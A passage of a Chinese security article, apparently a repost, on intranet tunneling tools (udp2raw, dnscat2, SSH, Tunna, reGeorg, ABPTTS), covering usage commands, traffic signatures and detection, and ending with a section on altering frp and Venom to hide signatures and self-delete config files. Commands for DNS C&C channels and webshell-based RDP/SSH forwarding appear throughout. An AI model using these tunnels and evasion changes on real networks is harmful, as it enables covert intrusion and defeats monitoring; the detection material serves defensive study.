./udp2raw_amd64 -s -l0.0.0.0:4096  -r127.0.0.1:7777   -k "passwd" --raw-mode faketcp   --cipher-mode xor  -a

在client端运行:
./udp2raw_amd64 -c -l0.0.0.0:3333  -r192.168.1.133:4096 -k "passwd" --raw-mode faketcp   --cipher-mode xor  -a
```

服务端

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwbiac0V1RkxdcnDvVvU4yNrl5U2RdTebQ5e5UOxMjk3XBZFsFVslicMicw/640?wx_fmt=png)

客户端

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwyDaQ1w62wHHJ0iaVNuiaUpFINwXOcU2NSaTwZcWRS50g7iaiajRNYpxmmg/640?wx_fmt=png)

### **6、UDP 隧道流量特征**

Udp2raw

利用 udp2raw 技术构建的隧道，目前在流量上未发现明显的特征

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw5jG2dLn1XV0s4yvAWubiaUXzOv0k2wibDnOKk1le35nxcwPlpyT17zog/640?wx_fmt=png)

### **7、DNS 隧道技术**

DnsCat2 && Dnscat2-Powrshell

*   介绍
    

dnscat2 是一款开源软件，使用 DNS 协议创建加密的 C&C 通道，通过预共享密钥进行身份验证。使用 Shell 及 DNS 查询类型 (TXT、MX、CNAME、A、AAAA)，多个同时进行的会话类似于 SSH 中的隧道。dnscat2 的客户端是有 Windows 版和 Linux 版，服务端是用 Ruby 语言编写的。

使用 dnscat2 隧道的模式有两种，分别是直连模式和中继模式。  
直连模式：客户端直接向指定 IP 地址的 DNS 服务器发起 DNS 解析请求  
中继模式：DNS 经过互联网的迭代解析，指向指定的 DNS 服务器。

*   下载
    

https://github.com/iagox86/dnscat2

https://github.com/lukebaggett/dnscat2-powershell

*   使用
    

1）直连模式

```
ruby ./dnscat2.rb -s 553 -c password --no-cache

dnscat2-client.exe --dns server=192.168.1.133,port=553 --secret=password
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw2CTz1eGfFCZRTx98FJjyFkugkosUGLuMib4FGM5w5Xs2GCTblhkkQ4g/640?wx_fmt=png)

2）中继模式

```
#-e 指定安全级别，open 表示服务端允许客户端不进行加密
ruby ./dnscat2.rb www.dnstuneltest.com -c password --no-cache -e open
dnscat2-client.exe --dns domain=www.dnstuneltest.com --secret=password
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw3SpRBQtKGLYAHvdZGzQ15BeFIKL0M9Y0zbzKGgz3lHEK5KBZzkSkibg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwIQrXZicvZRuS4RxABnibYQqwCos4h7JXqdlZEicbxFgGaDtVzjWUnhPAw/640?wx_fmt=png)

### **8、DNS 隧道流量特征**

直连模式下，dnscat2 存在明显的连接特征

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwzGtbvjraqapG9ONV9hE5oBnibUTqZ6icRASMbHgNqic1Rsje8rWSjVDsw/640?wx_fmt=png)

中继模式下的 dnscat2，除开携带域名信息外，无其他明显流量特征

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwg7bpHrPibdt5O6wrOX4b1zvR956A64Zef4jhGoX9oXAe3DCl4WrPbpw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwTDXYDcyBN9p9QiaMHe3Z0oQb15coWu7uWcwKltNagEFjqqjVshVgHkg/640?wx_fmt=png)

除了域名信息外，单位时间内 dns 数据包的发送频率也可以当作特征处理。

### **9、SSH 隧道技术**

```
sudo ssh -N -f -L 192.168.1.133:4444:192.168.1.129:3389 192.168.1.133
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwY25L5KtVskx9hPohxMYibSR3Bk1MqEib9TgAC7DQEiciaMODQ7bLbicRib1g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwrao1E8iabFwcWrUTuObpEN9TOOnJflTtgP7sTHCBeFKWazVpeppJt2g/640?wx_fmt=png)

### **10、SSH 隧道流量特征**

在利用 ssh 进行隧道转发的过程中，除第一个数据包会出现机器的用户名外，在流量过程中无其他明显指纹

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwiarlSicOCYoRiawDzaZiaCdicvRudM6pRNk0BUySm3nLTiaIALkTbufq58Gw/640?wx_fmt=png)

### **11、HTTP 隧道技术**

tunnel

*   介绍
    

Tunna 是一组工具，它将通过 HTTP 包装和隧道任何 TCP 通信。它可用于绕过完全防火墙环境中的网络限制。

*   下载
    

https://github.com/SECFORCE/Tunna

*   使用
    

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwDfu3FOOJ4EQVB7XmV3TMKkhrdGgCRCs393U8zXKTRffWEVO3ibibibPJw/640?wx_fmt=png)

```
-l 表示本地监听的端口
-r 远程要转发的端口
-v 详细模式
-b 请求大小
-s 首先启动 pinging 线程 - 一些服务首先发送数据（例如 SSH）
-C 请求 cookie
-t 基本认证
```

1）连接 RDP

```
python proxy.py -u http://192.168.1.137:81/Files/common/conn.aspx -l 1234 -r 3389 –v
python proxy.py -u http://192.168.1.137:81/Files/common/conn.aspx -l 1234 -a 192.168.3.144 -r 3389
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwxoFZh6BnTY30Q0xj2f4WhtmOU3qQLzZEDJ7ZhQ0oViagHGba7VjMNQw/640?wx_fmt=png)

  
![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwhu6WL4FPicTKic1ian9SKhgxtNPic8hwcN2eMOTZ42MJfjbsvfkVia8ibVUw/640?wx_fmt=png)

2）连接 SSH

```
python proxy.py -u http://218.4.45.152:8877/job/conn.php -l 1234 -r 22 -v –s
```

reGeog&&Neo-reGeorg

*   介绍
    

reGeorg 是 reDuh 的继承者, 其主要是把内网服务器的端口通过 http/https 构建成隧道的一款工具。

Neo-reGeorg 是一个旨在积极重构 reGeorg 的项目，目的是：提高 tunnel 连接安全性、提高可用性，避免特征检测、提高传输内容保密性、应对更多的网络环境场景。

Neo-reGeorg 支持：

```
1、传输内容经过变形 base64 加密，伪装成 base64 编码
2、直接请求响应可定制化 (如伪装的404页面)
3、HTTP Headers 的指令随机生成，避免特征检测
4、HTTP Headers 可定制化
5、自定义 HTTP 响应码
6、多 URL 随机请求
7、服务端 DNS 解析
8、兼容 python2 / python3
9、服务端环境的高兼容性
(仅 php) 参考 pivotnacci 实现单 Session 创建多 TCP 连接，应对部分负载均衡场景
aspx/ashx/jsp/jspx 已不再依赖 Session，可在无 Cookie 等恶劣环境正常运行
(非 php) 支持内网转发，应对负载均衡环境
```

*   下载
    

https://github.com/sensepost/reGeorg

https://github.com/L-codes/Neo-reGeorg

*   使用
    

reGeorg

```
$ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwxsB9iax7JBfsDHYgyaR0yNGiczFZMkBNFev7qOPUGO72mibNSQuNdNKGQ/640?wx_fmt=png)

Neo-reGeorg

```
python3 neoreg.py generate -k password
python3 neoreg.py -k password -u http://xx/tunnel.php

python neoreg.py generate -k <you_password> --file 404.html --httpcode 404
python neoreg.py -k <you_password> -u <server_url> --skip

python neoreg.py -k <you_password> -u <server_url> --proxy socks5://10.1.1.1:8080

python neoreg.py -k <you_password> -u <server_url> -H 'Authorization: cm9vdDppcyB0d2VsdmU=' --cookie "key=value;key2=value2"
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwu6FQkBAh0iaV9fT0wriclicAVicIQ5rywnib9FHuNM8zncueHrZkiblsiaUicw/640?wx_fmt=png)

ABPTTS

*   介绍
    

ABPTTS 是 NCC Group 在 2016 年 blackhat 推出的一款将 TCP 流量通过 HTTP/HTTPS 进行流量转发的工具。

*   下载
    

https://github.com/nccgroup/ABPTTS

*   使用
    

```
git clone https://github.com/nccgroup/ABPTTS.git
pip install pycryptodome
pip install httplib2

#生成对应webshell
python abpttsfactory.py -o webshell

#把目标主机的3389端口转发到本地的7777端口
python abpttsclient.py -c webshell/config.txt -u "http://192.168.1.137:81/Files/common/abptts.aspx" -f 192.168.1.133:7777/127.0.0.1:3389
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwYkcFExZiaR8n4LurU2o7Lns5T3bkQej73TOvZ01DrtxrVWVjkicEaGlQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwa1qiaJSsUCcLia50Xw5XcwTa7ALbuTgPbXHSL2Wtsw2MmLDbFALzkCfQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw2WK94jEwKYGzo3q81ugkatfygLt93x2s3JbqGAD4IQm4MfPAkuBkzw/640?wx_fmt=png)

### **12、HTTP 隧道流量特征**

tunnel

页面特征

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwLmJFIVNyibvOUNKHC62UFFNJTrZPriaYaibAlZQgCoPt2TbWEEZzEgVZw/640?wx_fmt=png)

连接报文特征

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwsZ8eJBnUTawyUoun8DGgBOYVUgTTOk3IpecEN49Z7kiaKKkhSWzR6zg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwnPHqa9icaYW7GxwwzDeiaia962MuIOww1LZLmoiciakdJPqCicz1c28CTlOg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwKzW2HjH7Q5krZExP6ss3AzC72z5I6NkREWdR47GHUkg5Sqk9rqZzWQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwELuqiaorVsE0OuVjY9hUMeqTlkzl2iaOWqKib94A5rFUfXM0px8u2KpZg/640?wx_fmt=png)

reGeog&Neo-reGeorg**

对于 reGeog，其默认的页面特征为

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwZYEGdEUSich9pwnSIoqx2mtIwX97xulVGJ53AQfyXOz3bbjDW5ADCMg/640?wx_fmt=png)

从流量报文上看，也具有一定的特征信息

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw4YlAnoIOprO183fs5oeBWngBEBJE5IjaiaC9jVzrXGIH1eAHIcQ5mGw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwpRo8YicJcNcicOAI1LM9XgDmjczMlibx7kB0FAng8f4UPwHa08ZciakJRA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwQ86eTzNxhA5uyjfTvIlAJFPrpwEQQLax2XoXqtCEsic5X3bG0rDO7Wg/640?wx_fmt=png)

Neo-reGeog 的页面信息

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw7oSugur2XKBsSSSAoQuKWhjpVIHBkoKaUlqwqnMSQv0iacfPO4HtVFw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwvGQJkUsOc31vwZDMsEQTdrEvhXHWJVmaWBrOMNDRlk4TDPXV6roWGA/640?wx_fmt=png)

Neo-reGeog 的流量报文

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwpnmlZTAr2Rlv3z8MEzVCQibkqUHKALReicadSySTWpvlZOJz1SKAbubw/640?wx_fmt=png)

ABPTTS

abptts 页面特征

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwwShWo8EWXIAV1hXMuRJWNpZyzwvbIIU2LneIAydkW8DyZH2U5iaF8dA/640?wx_fmt=png)

查看报文特征

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwDhhMLgucvdUlZU4LaoRxnJwkMbOKAbBF2fwHelauNibAkgcibfsCba6g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwAhvgMhOPiaMpOKd6gfANAK6dJqYbYwux6kX1cr4WCqicvYJN4eRSUicEQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwsAWsDFmMmsEARZ7icKfutlt5p8cL0NpmraBRj2qUkibZw8esMLicm5MgA/640?wx_fmt=png)

**0x03 检测与防御**
--------------

### **1、检测**

以 frp 作为案例

端口检测、进程检测、网络检测、文件检测、行为检测、流量检测、日志检测

端口检测：默认配置下，frp 的服务端端口为 7000

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcws6P1vWePjCq59TzC9XFsbfQgorkKCShRYlu7Pcgxbrxs4LlzLnZxcQ/640?wx_fmt=png)

进程检测：从进程上看，frp 的进程名称非常明显

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwSwKj9U1Wzia7IfF1coDyxkyZhibCrssHxME5bdLQLMDibKYQskT17mZjQ/640?wx_fmt=png)

流量检测：默认配置下，frp 的建立连接过程和心跳维持过程都存在较为明显的特征。

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwTZ4Buk8IHvMRcG4M0huN8kXLprjlFxKUorIsQ9VGKkhokQgz1fGU6A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwvZMsAM2urabWjhVnfm9JjibpNjaK97NEvVIKw6YZc6GqIOHoaibjw9gw/640?wx_fmt=png)

添加 tls 加密后，frp 在协商前存在 0x17 的协议头部特征

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwP7ZYLous0yk3RVR1P2yiaNKHUrGZmh3ibACfU2buficzbpbUbnOFWKLrg/640?wx_fmt=png)

### **2、防御**

针对服务器：  
收敛出站权限（配置 NAT、反向代理、统一内部 DNS）

阻断恶意入站（部署企业级 WAF）

针对办公机：  
收拢协议  
规范行为

**0x04 改造**
-----------

### **1、frp 改造**

#### 修改结构特征

定位到 frp\pkg\msg\msg.go 文件，修改结构体中的特征

```
Login\LoginResp\NewProxy\NewProxyResp\CloseProxy\NewWorkConn\StartWorkConn\NewVisitorConn
NewVisitorConnResp\Ping\UDPPacket\NatHoleVisitor\NatHoleClient\NatHoleResp\NatHoleSid
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw2M1IKiaJygEaPXVQjg50HAAQoYx4eiclaniaV7a9kLIwsT2Rv7uoFr1iaQ/640?wx_fmt=png)

注意每个字段的一致性，特别是 PrivilegeKey、Timestamp 和 RunID

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwys2ibXHNepPfjvcc7l9ut4cicXicu0Ss5uiadvbeFqcrpcZLmXNuibUialQQ/640?wx_fmt=png)

定位到 frp\pkg\util\version\version.go 文件，修改版本特征

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwDLBcTraWkuadcvxrZRTaS2swFCXfzpHpQKo9DV2njIQGbALyUhd1UQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwfcnp6EiaUpiaNu8z3vtbFnAT8OFcQMGG8icHBAq5Of4zluGtpMNvZTkFA/640?wx_fmt=png)

修改版本对比

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwWovgibe7bWqd1ibPNbCe7iaMUmOah1ajd7F4UNRplXJNpTialY3x9H9TlQ/640?wx_fmt=png)

测试

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwictia37wsUjpDrBHdKHcUIGamUzz6c4xsCwJWDcIA9uFwG9KIadkOkwg/640?wx_fmt=png)

#### 修改默认加密 salt

修改服务端和客户端的默认 salt

frp/cmd/frpc/main.go

frp/cmd/frps/main.go

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwb54JCPyDk3jhR0PhZkTQxmj1jicC9tSfcJrPeicCiawbeovWno5YEd2ibg/640?wx_fmt=png)

#### 修改 Tls 协议 0x17 特征

修改 frp 的 tls 协议中固定的 0x17 特征

frp/pkg/util/net/tls.go

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwOFbOKWXE9yibxBQoFeUEwlsTKlEvsGTU3BPIvTDBzxXJrO1EHon6hwQ/640?wx_fmt=png)

#### 配置文件自删除

在 frp/cmd/frpc/sub/root.go 中，注册变量，在 RegisterCommonFlags 函数中注册参数，最后在 startService 运行检测函数中添加自删除操作

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcw2JxicibZ5UicKV9lA8AqAQEYhuibFf4YR50egZ3yiaYaW5G66z6QxZ54T4g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwMyicgVcCx9e63BaZ6w38oPlIIKQUSYic7rdCnbuR66bEejPf0ibowsc4A/640?wx_fmt=png)

### **2、Venom 改造**

venom 的特征在于协议的数据分隔符和在端口重用时的鉴别符号，修改 global/global.go 后，重新编译，即可实现特征隐藏。

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwFX7anbPnQjJ8E0KLsKLzPvdNDFSxj2lNlTgnU5t4BSjd2as4Z5jrYw/640?wx_fmt=png)

改造后的 venom，未进行加密情况下的报文信息中无原来的协议特征

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2d0jrOuk8Le3ryicrV34wcwebxHnQIUxuMyDp0LSQRgF0YdkMiaLHgQ01hUL9UibLUwa7bFpeHH0PGA/640?wx_fmt=png)

**0x05 参考**
-----------

烽火台实验室 -《内网代理工具与检测方法研究》

FreeBuf-kczwa1-《内网全局代理工具及特征分析》

天融信安全服务 -《安全运营内刊｜检测与防护能力 - 隧道工具的使用与检测》

作者：RJ45，文章来源于 https://rj45mp.github.io/

扫码加个好友进  

cisp 系列考证备考群

请备注进群  

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic02ySddSLayN5oWIZvkvD3CcIMM9icbOgy9gFMAiag3Nx9LxszOibic7ibqMXp6G8zAYdNHTbtCUiaZV4EQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)